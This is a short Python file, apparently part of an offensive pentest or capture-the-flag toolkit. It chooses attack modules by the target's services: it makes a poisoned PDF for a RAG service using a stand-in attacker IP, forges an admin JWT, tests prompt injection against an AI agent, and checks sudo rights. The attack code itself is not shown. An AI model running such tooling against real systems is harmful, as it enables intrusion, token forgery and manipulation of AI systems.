from agents.aria_agent import AriaAgent
from agents.nexus_agent import NexusAgent
from agents.brain_agent import BrainAgent
from agents.root_agent import RootAgent
from core.database import get_db

class AgentManager:
    def __init__(self, target):
        self.target = target
        self.db = get_db()

    def deploy_best_agent(self):
        recon_data = self.db.get("recon_data", {})
        services = recon_data.get("services", [])
        
        print(f"[*] Agent Manager: Analizando vectores para {self.target}...")

        if any("FastAPI" in s for s in services):
            print("[!] Vector RAG detectado. Desplegando Brain Agent...")
            brain = BrainAgent()
            brain.generate_poisoned_pdf(attacker_ip="10.10.14.X")
            
        if any("Flask" in s or "3000" in s for s in services):
            print("[!] Vector Web/JWT detectado. Desplegando Aria y Nexus...")
            nexus = NexusAgent(self.target)
            nexus.forge_admin_token()
            aria = AriaAgent(self.target)
            aria.test_prompt_injection()

        # Root Agent siempre audita al final
        root = RootAgent()
        root.check_sudo_rights()
